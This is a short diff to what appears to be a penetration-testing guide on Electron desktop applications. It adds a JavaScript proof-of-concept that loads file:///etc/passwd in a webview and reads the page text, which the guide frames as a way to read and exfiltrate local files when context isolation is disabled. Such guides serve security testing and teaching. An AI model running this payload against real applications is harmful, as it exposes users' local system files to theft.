@@ -140,6 +140,16 @@ module.exports.getGPUDriverVersions = async () => {
 
 If `contextIsolation` is set to `false`, you can try to use `<webview>` (similar to `<iframe>`, but it can load local files) to read local files and exfiltrate them: using something like  `<webview src="file:///etc/passwd"></webview>`
 
+```js
+<webview src="file:///etc/passwd"></webview>
+webview = document.querySelector("webview")
+webview.addEventListener('dom-ready', () => {
+	setTimeout(function(){
+		webview.executeJavaScript("alert(`Stolen page:\n\n`+document.body.innerText)")
+	},1000)	
+})
+
+```
 
 ## Phishing and credential harvesting (Loading Unsafe Remote Content)
 
